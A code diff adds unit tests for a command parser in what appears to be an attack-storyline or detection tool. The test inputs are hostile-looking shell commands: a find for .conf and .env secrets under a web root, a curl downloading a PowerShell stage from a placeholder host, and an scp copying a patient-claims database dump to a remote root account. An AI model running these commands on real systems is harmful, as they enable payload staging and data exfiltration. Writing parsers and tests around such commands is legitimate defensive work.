@@ -43,6 +43,22 @@ class TestStorylineCommandNetworks:
 
         assert target is None
 
+    def test_extract_output_file_ignores_find_or_operator(self):
+        output_file = StorylineMixin._extract_output_file(
+            "find /var/www/html -name *.conf -o -name *.env",
+            "linux",
+        )
+
+        assert output_file is None
+
+    def test_extract_output_file_accepts_short_o_for_output_tools(self):
+        output_file = StorylineMixin._extract_output_file(
+            "curl -s -o /tmp/stage.ps1 https://example.test/stage.ps1",
+            "linux",
+        )
+
+        assert output_file == "/tmp/stage.ps1"
+
     def test_extract_scp_target_from_remote_destination(self):
         target = StorylineMixin._extract_scp_target(
             "scp /tmp/patient_claims.sql.gz root@10.10.2.30:/var/tmp/",
